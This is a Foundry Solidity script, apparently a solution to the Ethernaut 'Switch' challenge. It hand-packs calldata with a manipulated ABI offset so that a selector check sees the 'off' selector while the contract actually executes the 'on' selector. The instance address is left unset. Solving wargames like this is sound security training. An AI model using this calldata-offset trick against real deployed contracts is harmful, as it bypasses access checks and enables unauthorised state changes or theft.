pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Switch} from "../src/Switch.sol";

// for local testing
contract deploy is Script
{
    function run() external
    {
        vm.startBroadcast();

        Switch mySwitch = new Switch();

        vm.stopBroadcast();
    }
}

contract flip is Script
{
    event logCalldata(bytes);

    function run() external
    {
        vm.startBroadcast();

        address switchAddr; // instance address

        bytes4  flipSwitchSelector = 0x30c13ade;

// offset is the distance between the start of calldata (right after the first selector)
// and the slot where data length is stored (data length slot doesnt count)
// 6 * 16**1 + 0 * 16**0 = 96 = 3 slots of 32 bytes from the beginning
        bytes32 offset = 0x0000000000000000000000000000000000000000000000000000000000000060;
        bytes1  dataLength = 0x04;         // target data is a function selector so 4 bytes
        bytes4  offSelector = 0x20606e15;
        bytes4  onSelector = 0x76227e12;

        bytes memory data = abi.encodePacked(
            flipSwitchSelector, // 4 bytes
            offset,                        // 32 bytes  (start of calldata)

            bytes32(0),                    // 32 bytes

            offSelector,                   // 4 bytes
            bytes28(0),                    // 28 bytes

        // data starts in the next slot and is 4 bytes long

            bytes31(0),                    // 31 bytes
            dataLength,                    // 1 byte

            onSelector                     // 4 bytes
        );

        emit logCalldata(data); // optionally print the packed calldata

        (bool success, ) = switchAddr.call(data);
        require(success, "flip call failed");

        vm.stopBroadcast();
    }
}
